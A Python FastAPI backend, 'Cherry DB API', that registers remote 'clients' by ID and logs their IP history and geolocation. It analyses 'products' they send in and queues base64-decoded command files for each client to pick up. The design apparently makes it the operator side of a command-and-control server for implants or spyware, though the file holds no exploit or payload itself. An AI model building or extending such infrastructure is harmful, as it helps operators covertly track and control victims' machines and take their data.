import argparse
import asyncio
import base64
from pathlib import Path
import uuid
from dotenv import load_dotenv
from fastapi import FastAPI, Depends, HTTPException
from fastapi.concurrency import asynccontextmanager
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from sqlalchemy.orm import joinedload
from datetime import datetime, timezone
from typing import List

from Cherry import analyzer
from Cherry.commands import get_client_commands_dir
from Cherry.protocol import ClientCommand, ClientConnection, DetailedClientInfo, ClientInfo
from Cherry.database import Database
from Cherry.models import Client, ClientIP, Location
from PoopBiter.utils import unhex


parser = argparse.ArgumentParser("Cherry DB API")
parser.add_argument("--root", type=Path, default=Path(
    "CornCake"), help="Root path to store the data")
_args = parser.parse_args()
ROOT = _args.root

database = Database(ROOT)
load_dotenv()


@asynccontextmanager
async def lifespan(app: FastAPI):
    await database.init_db()
    asyncio.create_task(analyzer.analyze_incoming_products(ROOT))
    yield


app = FastAPI(lifespan=lifespan)


@app.post("/client-connected")
async def client_connected(connection: ClientConnection, db: AsyncSession = Depends(Database.get_db)):
    client_id = int(connection.client_id, 16)
    # Get or create client
    client = await db.get(Client, client_id)
    if not client:
        client = Client(client_id=client_id)
        db.add(client)
    
    client.last_connection = datetime.now(timezone.utc)

    # Update or create IP address
    stmt = select(ClientIP).where(
        ClientIP.client_id == client_id,
        ClientIP.ip_address == connection.ip
    )
    result = await db.execute(stmt)
    ip_record = result.scalar_one_or_none()
    
    if not ip_record:
        ip_record = ClientIP(
            client_id=client_id,
            ip_address=connection.ip
        )
        db.add(ip_record)
    else:
        ip_record.last_seen = client.last_connection
    
    await db.commit()
    return {"status": "success"}

@app.get("/get-clients", response_model=List[ClientInfo])
async def get_clients(db: AsyncSession = Depends(Database.get_db)):
    stmt = select(Client).options(
        joinedload(Client.ip_addresses),
    )
    result = await db.execute(stmt)
    clients = result.unique().scalars().all()
    
    return [
        ClientInfo(
            client_id=f"{client.client_id:x}",
            last_connection=client.last_connection,
            current_ip=client.ip_addresses[-1].ip_address if client.ip_addresses else None
        ) for client in clients
    ]


async def _get_formatted_location(latitude: float, longitude: float, db: AsyncSession) -> str:
    stmt = select(Location).where(Location.longitude ==
                                  longitude and Location.latitude == latitude)
    result = await db.execute(stmt)
    formatted = result.unique().scalar_one_or_none()

    return formatted.label if formatted is not None else f"({latitude}, {longitude})"


@app.get("/get-client/{client_id}", response_model=DetailedClientInfo)
async def get_client_details(client_id: str, db: AsyncSession = Depends(Database.get_db)):
    stmt = select(Client).where(Client.client_id == unhex(client_id)).options(
        joinedload(Client.ip_addresses)
    )
    result = await db.execute(stmt)
    client = result.unique().scalar_one_or_none()
    
    if not client:
        raise HTTPException(status_code=404, detail="Client not found")
    
    location = await _get_formatted_location(
        client.location_lat, client.location_long, db) if client.location_accuracy_meters is not None else None

    return DetailedClientInfo(
        client_id=f"{client.client_id:x}",
        last_connection=client.last_connection,
        ip_history=[{
            "ip": ip.ip_address,
            "first_seen": ip.first_seen,
            "last_seen": ip.last_seen
        } for ip in sorted(client.ip_addresses, key=lambda x: x.last_seen, reverse=True)],
        products=analyzer.get_client_products(ROOT, client_id),
        location=location,
        commands_dir=get_client_commands_dir(ROOT, client_id).absolute().as_posix()
    )

@app.post("/send-command")
async def send_command(command: ClientCommand):
    path = get_client_commands_dir(ROOT, command.client_id) / f"{uuid.uuid4().hex}.cmd"
    path.parent.mkdir(exist_ok=True)
    path.write_bytes(base64.b64decode(command.data))
    return {"status": "success"}
